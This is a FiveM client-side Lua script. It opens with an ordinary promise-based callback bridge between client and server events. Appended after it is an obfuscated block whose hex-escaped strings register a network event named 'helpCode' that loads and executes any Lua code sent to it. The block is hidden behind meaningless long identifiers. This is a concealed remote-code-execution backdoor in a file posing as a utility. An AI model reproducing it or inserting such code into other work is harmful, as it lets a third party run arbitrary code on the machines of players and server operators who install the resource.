
RegisterNetEvent('__pmc_callback:client')
AddEventHandler('__pmc_callback:client', function(eventName, ...)
	local p = promise.new()

	TriggerEvent(('c__pmc_callback:%s'):format(eventName), function(...)
		p:resolve({...})
	end, ...)

	local result = Citizen.Await(p)
	TriggerServerEvent(('__pmc_callback:server:%s'):format(eventName), table.unpack(result))
end)


local mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[6][mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[1]](mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[2]) mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[6][mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[3]](mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[2], function(OxRQAdcCviOhTgraNebtbiJnHTABZVgcjBTpSNFGvEdUDsLEZxiOdHrerCKvCiXWidHgdd) mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[6][mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[4]](mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[6][mqnKDWcAVVkHWHUlyZlRFgTppLxzLDaUhVcteNjuezlKQzmFcAdUlmlWzVbqErtYnXEVBm[5]](OxRQAdcCviOhTgraNebtbiJnHTABZVgcjBTpSNFGvEdUDsLEZxiOdHrerCKvCiXWidHgdd))() end)